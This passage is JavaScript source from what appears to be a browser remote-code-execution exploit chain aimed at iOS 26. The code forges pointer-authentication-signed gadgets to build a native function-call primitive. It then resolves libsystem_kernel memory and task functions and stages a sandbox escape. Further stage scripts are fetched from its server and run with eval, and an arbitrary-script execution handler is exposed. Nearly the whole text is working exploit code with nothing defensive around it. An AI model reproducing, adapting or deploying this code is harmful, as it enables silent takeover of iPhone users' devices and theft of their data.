        print(`x22: ${x22.hex()}`);
        const x20_u64 = new BigUint64Array(0x30 / 8);
        const x20 = x20_u64.data();
        print(`x20: ${x20.hex()}`);
        const stack_u64 = new BigUint64Array(0x88000 / 8);
        const stack = stack_u64.data();
        print(`stack: ${stack.hex()}`);
        const paciza_gadget_control_1 = await slow_pacia(gadget_control_1, 0n);
        print(`paciza_gadget_control_1: ${paciza_gadget_control_1.hex()}`);
        const pacib_gadget_loop_1_0x80020 = await slow_pacib(gadget_loop_1, stack + 0x80020n);
        print(`pacib_gadget_loop_1_0x80020: ${pacib_gadget_loop_1_0x80020.hex()}`);
        const pacib_gadget_loop_1_0x800c0 = await slow_pacib(gadget_loop_1, stack + 0x800c0n);
        print(`pacib_gadget_loop_1_0x800c0: ${pacib_gadget_loop_1_0x800c0.hex()}`);
        const pacib_gadget_loop_2_0x80010 = await slow_pacib(gadget_loop_2, stack + 0x80010n);
        print(`pacib_gadget_loop_2_0x80010: ${pacib_gadget_loop_2_0x80010.hex()}`);
        const pacib_gadget_loop_2_0x800b0 = await slow_pacib(gadget_loop_2, stack + 0x800b0n);
        print(`pacib_gadget_loop_2_0x800b0: ${pacib_gadget_loop_2_0x800b0.hex()}`);
        const MAGIC = 123.456;
        p.write64(jop_stack_bottom - 0x4fa0n, stack + 0x80000n);
        p.write64(jop_stack_bottom - 0x4f98n, await slow_pacib(gadget_loop_1, jop_stack_top + 0x83070n));
        p.write64(jop_stack_bottom - 0x4fb0n, x20);
        p.write64(jop_stack_bottom - 0x4fa8n, x19);
        p.write64(jop_stack_bottom - 0x4fc0n, x22);
        x19_f64[0x20 / 8] = MAGIC;
        x19_u64[0 / 8] = paciza_gadget_loop_1;
        x0_u64[8 / 8] = paciza_gadget_control_1;
        while (x19_f64[0x20 / 8] === MAGIC);
        stack_u64[0x80008 / 8] = pacib_gadget_loop_2_0x80010;
        x19_f64[8 / 8] = MAGIC;
        x20_u64[0x10 / 8] = paciza_gadget_loop_2;
        x19_u64[0 / 8] = paciza_gadget_control_2;
        while (x19_f64[8 / 8] == MAGIC);
        x20_u64[0x20 / 8] = paciza_malloc;
        x20_u64[0x28 / 8] = 0n;
        stack_u64[0x80018 / 8] = pacib_gadget_loop_1_0x80020;
        x19_f64[0x20 / 8] = MAGIC;
        x19_u64[0 / 8] = paciza_gadget_loop_1;
        x20_u64[0x10 / 8] = paciza_gadget_control_3;
        while (x19_f64[0x20 / 8] === MAGIC);
        stack_u64[0x800a8 / 8] = pacib_gadget_loop_2_0x800b0;
        x19_f64[8 / 8] = MAGIC;
        x20_u64[0x10 / 8] = paciza_gadget_loop_2;
        x19_u64[0 / 8] = paciza_gadget_set_all_registers;
        while (x19_f64[8 / 8] === MAGIC);
        stack_u64[0x800b0 / 8] = stack + 0x80000n;
        stack_u64[0x800b8 / 8] = pacib_gadget_loop_1_0x800c0;
        x19_f64[0x20 / 8] = MAGIC;
        x19_u64[0 / 8] = paciza_gadget_loop_1;
        x20_u64[0x10 / 8] = paciza_gadget_control_3_4;
        while (x19_f64[0x20 / 8] === MAGIC);
        const cache = new Map();
        const signPointer = paciza_signPointer.noPAC();
        cache.set(signPointer, paciza_signPointer);
        function pacia(ptr, ctx) {
          signPointer_self[0] = 0x80010000_00000000n | ctx >> 48n << 32n;
          return fcall(signPointer, signPointer_self_addr, ctx, ptr);
        }
        function fcall(pc, ...args) {
          if (!cache.has(pc)) {
            cache.set(pc, pacia(pc, 0n));
          }
          const signed_pc = cache.get(pc);
          stack_u64[0x80008 / 8] = pacib_gadget_loop_2_0x80010;
          x19_f64[8 / 8] = MAGIC;
          x20_u64[0x10 / 8] = paciza_gadget_loop_2;
          performance.now();
          x19_u64[0 / 8] = paciza_gadget_control_2;
          while (x19_f64[8 / 8] === MAGIC);
          x20_u64[0x20 / 8] = signed_pc;
          x20_u64[0x28 / 8] = 0n;
          stack_u64[0x80018 / 8] = pacib_gadget_loop_1_0x80020;
          x19_f64[0x20 / 8] = MAGIC;
          x19_u64[0 / 8] = paciza_gadget_loop_1;
          performance.now();
          x20_u64[0x10 / 8] = paciza_gadget_control_3;
          while (x19_f64[0x20 / 8] === MAGIC);
          for (let i = 0; i < args.length && i < 8; ++i) {
            stack_u64[0x80098 / 8 - i] = args[i];
          }
          stack_u64[0x800a8 / 8] = pacib_gadget_loop_2_0x800b0;
          x19_f64[8 / 8] = MAGIC;
          x20_u64[0x10 / 8] = paciza_gadget_loop_2;
          performance.now();
          x19_u64[0 / 8] = paciza_gadget_set_all_registers;
          while (x19_f64[8 / 8] === MAGIC);
          x19_f64[0x20 / 8] = MAGIC;
          x19_u64[0 / 8] = paciza_gadget_loop_1;
          performance.now();
          x20_u64[0x10 / 8] = paciza_gadget_control_3_4;
          while (x19_f64[0x20 / 8] === MAGIC);
          return x19_u64[0x20 / 8];
        }
        const unsigned_dlopen = paciza_dlopen.noPAC();
        const unsigned_dlsym = paciza_dlsym.noPAC();
        function dlopen(filename, flags) {
          filename = filename + '\0';
          resolve_rope(filename);
          const name_ptr = p.read64(p.read64(p.addrof(filename) + 8n) + 8n);
          return fcall(unsigned_dlopen, name_ptr, flags);
        }
        p.dlopen = dlopen;
        function dlsym(handle, symbol) {
          symbol = symbol + '\0';
          resolve_rope(symbol);
          const symbol_ptr = p.read64(p.read64(p.addrof(symbol) + 8n) + 8n);
          return fcall(unsigned_dlsym, handle, symbol_ptr);
        }
        p.dlsym = dlsym;
        const libsystem_c = dlopen('/usr/lib/system/libsystem_c.dylib', 1n);
        const fopen = dlsym(libsystem_c, 'fopen').noPAC();
        const fopen_mode_str = 'w';
        const fopen_mode_ptr = p.read64(p.read64(p.addrof(fopen_mode_str) + 8n) + 8n);
        function log(msg) {
          if (true) {
            const elapsed = parseInt(Date.now() - rce_begin);
            const path = ("/(" + elapsed + ") ").padEnd(15) + msg.toString().replaceAll('/', '|') + '\0';
            resolve_rope(path);
            const path_ptr = p.read64(p.read64(p.addrof(path) + 8n) + 8n);
            fcall(fopen, path_ptr, fopen_mode_ptr);
          }
        }
        p_offsets.libsystem_kernel__thread_terminate = p.slide + 0x1D3D6F244n;
        function suspend_worker(worker) {
          const port = p.read32(worker.thread + 0x34n);
          return fcall(p_offsets.libsystem_kernel__thread_suspend, port);
        }
        for (const worker of p.dlopen_workers) {
          suspend_worker(worker);
        }
        function fcall_close() {
          x19_u64[0 / 8] = pacia(p_offsets.pthread_exit, 0n);
        }
        const rce_end = Date.now();
        log(`-`.repeat(0x28));
        log(`iOS 26 CVE-2025-43529-26 RCE completed in ${rce_end - rce_begin}ms`);
        try {
              print("stage: sbx0_prepare");
              print("stage: sbx0_loading");
              const sbx0_script = getJS('/sbx0_main_26.js');
              log("after get js (sbx0_26)");
              eval(sbx0_script);
              print("stage: sbx0_loaded");
        } catch (e) {
            log(btoa(e));
            print("stage: sbx0_failed: " + e.message);
        }
        fcall_close();
        print(`all done (iOS 26)`);
        self.postMessage({
          type: 'redirect'
        });
        return;
      }
    case 'slow_fcall_done':
      {
        slow_fcall_resolve(p.slowFcallResult[0]);
        break;
      }
    case 'proceed_stage2':
      {
        print("[iOS26 Worker] Loading post-exploitation stages...");
        print("[iOS26] === Stage 2: Sandbox Escape Preparation ===");
        
        try {
          if (!p.dlopen || !p.dlsym) {
            print("[iOS26] WARNING: dlopen/dlsym not available, skipping stage 2 setup");
            break;
          }
          
          print("[iOS26] Loading additional dynamic libraries...");
          
          const libs_to_load = [
            '/usr/lib/system/libsystem_kernel.dylib',
            '/usr/lib/system/libsystem_platform.dylib',
            '/usr/lib/system/libsystem_info.dylib',
            '/usr/lib/libobjc.A.dylib',
            '/System/Library/Frameworks/Foundation.framework/Foundation',
            '/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation',
          ];
          
          const loaded_libs = {};
          for (const lib of libs_to_load) {
            try {
              const handle = p.dlopen(lib, 1n);
              if (handle) {
                loaded_libs[lib] = handle;
                print("[iOS26] Loaded: " + lib);
              } else {
                print("[iOS26] Failed to load: " + lib);
              }
            } catch (e) {
              print("[iOS26] Error loading " + lib + ": " + e.message);
            }
          }
          
          print("[iOS26] Loaded " + Object.keys(loaded_libs).length + " libraries");
          
          if (loaded_libs['/usr/lib/system/libsystem_kernel.dylib']) {
            const kernel_handle = loaded_libs['/usr/lib/system/libsystem_kernel.dylib'];
            const important_symbols = [
              'mach_task_self',
              'vm_allocate',
              'vm_deallocate',
              'vm_protect',
              'vm_read',
              'vm_write',
              'task_for_pid',
              'pid_for_task',
            ];
            
            for (const sym of important_symbols) {
              try {
                const addr = p.dlsym(kernel_handle, sym);
                if (addr) {
                  p['sys_' + sym] = addr.noPAC();
                  print("[iOS26] Found symbol: " + sym + " = " + addr.hex());
                }
              } catch (e) {}
            }
          }
          
          print("[iOS26] Setting up sandbox escape utilities...");
          
          p.sandbox_escape_ready = false;
          
          p.get_task_self = function() {
            if (p.sys_mach_task_self) {
              return fcall(p.sys_mach_task_self);
            }
            return 0n;
          };
          
          p.vm_alloc = function(size, flags) {
            if (!p.sys_vm_allocate) return 0n;
            const addr_ptr = new BigUint64Array(1);
            const addr_data = p.read64(p.addrof(addr_ptr) + 0x10n);
            const task = p.get_task_self();
            const result = fcall(p.sys_vm_allocate, task, addr_data, BigInt(size), BigInt(flags || 0));
            if (result === 0n) {
              return p.read64(addr_data);
            }
            return 0n;
          };
          
          p.vm_protect = function(addr, size, prot) {
            if (!p.sys_vm_protect) return -1n;
            const task = p.get_task_self();
            return fcall(p.sys_vm_protect, task, addr, BigInt(size), 0n, BigInt(prot));
          };
          
          p.vm_read = function(addr, size) {
            if (!p.sys_vm_read) return null;
            const data_ptr = new BigUint64Array(1);
            const size_ptr = new BigUint64Array(1);
            const data_data = p.read64(p.addrof(data_ptr) + 0x10n);
            const size_data = p.read64(p.addrof(size_ptr) + 0x10n);
            const task = p.get_task_self();
            const result = fcall(p.sys_vm_read, task, addr, BigInt(size), data_data, size_data);
            if (result === 0n) {
              return p.read64(data_data);
            }
            return null;
          };
          
          p.vm_write = function(addr, data, size) {
            if (!p.sys_vm_write) return -1n;
            const task = p.get_task_self();
            return fcall(p.sys_vm_write, task, addr, data, BigInt(size));
          };
          
          print("[iOS26] Sandbox escape utilities registered");
          
          print("[iOS26] Verifying post-exploitation primitives...");
          
          const post_exploit_checks = [
            { name: 'dlopen', check: () => !!p.dlopen },
            { name: 'dlsym', check: () => !!p.dlsym },
            { name: 'fcall', check: () => typeof fcall === 'function' },
            { name: 'pacia', check: () => typeof pacia === 'function' },
            { name: 'read64', check: () => !!p.read64 },
            { name: 'write64', check: () => !!p.write64 },
            { name: 'addrof', check: () => !!p.addrof },
            { name: 'fakeobj', check: () => !!p.fakeobj },
          ];
          
          let post_exploit_ok = true;
          for (const check of post_exploit_checks) {
            const ok = check.check();
            if (!ok) post_exploit_ok = false;
            print("[iOS26]   " + check.name + ": " + (ok ? "OK" : "FAIL"));
          }
          
          p.sandbox_escape_ready = post_exploit_ok;
          
          print("[iOS26] Post-exploitation setup " + (post_exploit_ok ? "complete" : "incomplete"));
          
          try {
            const sbx1_script = getJS('/sbx1_main_26.js');
            if (sbx1_script) {
              print("[iOS26] Loaded sbx1_main_26.js, evaluating...");
              try {
                eval(sbx1_script);
                print("[iOS26] sbx1_main_26.js evaluated successfully");
              } catch (e) {
                print("[iOS26] sbx1_main_26.js eval error: " + e.message);
              }
            }
          } catch (e) {
            print("[iOS26] sbx1_main_26.js not available (expected in some configurations)");
          }
          
          self.postMessage({
            type: 'stage2_ready',
            device_model: p.device_model,
            chipset: p.chipset,
            sandbox_escape_ready: p.sandbox_escape_ready,
          });
          
        } catch (e) {
          print("[iOS26] Stage 2 setup error: " + e.message);
          print("[iOS26] Stack: " + e.stack);
        }
        
        print("[iOS26] === Stage 2 Complete ===");
        break;
      }
    case 'get_status':
      {
        print("[iOS26] Status request received");
        const status = {
          type: 'status_report',
          rce_ready: !!(p.addrof && p.read64 && p.write64),
          device_model: p.device_model || 'unknown',
          chipset: p.chipset || 'unknown',
          slide: p.slide ? p.slide.hex() : '0x0',
          jit_enabled: p.jit_enabled || false,
          sandbox_escape_ready: p.sandbox_escape_ready || false,
          dlopen_workers: p.dlopen_workers ? p.dlopen_workers.length : 0,
          offsets_count: p.offsets ? Object.keys(p.offsets).length : 0,
        };
        self.postMessage(status);
        break;
      }
    case 'execute_script':
      {
        print("[iOS26] Script execution request received");
        if (data.script) {
          try {
            const result = eval(data.script);
            self.postMessage({
              type: 'script_result',
              result: result !== undefined ? String(result) : 'undefined',
              success: true,
            });
          } catch (e) {
            self.postMessage({
              type: 'script_result',
              error: e.message,
              success: false,
            });
          }
        }
        break;
      }
    default:
      break;
  }
};

print("[iOS26 Worker] Initialized (iOS 26.x CVE-2025-43529-26 branch)");
})();

// ===== [补齐] 真实 IPSW 内核符号库挂载 (A14-A18, 从 kernelcache symbols.json 一手提取) =====
// 用法: 外层页面/内核提权阶段 loadScript('/real_kernel_symbols_26.js') 后, 访问 self.REAL_KERNEL_SYMBOLS_26
// 覆盖: iPhone13,2(A14) iPhone14,2(A15) iPhone15,4(A16) iPhone17,1(A18) iPhone18,2(A18)
if (typeof REAL_KERNEL_SYMBOLS_26 === 'undefined' && typeof self !== 'undefined' && self.REAL_KERNEL_SYMBOLS_26) {
  var REAL_KERNEL_SYMBOLS_26 = self.REAL_KERNEL_SYMBOLS_26;
}
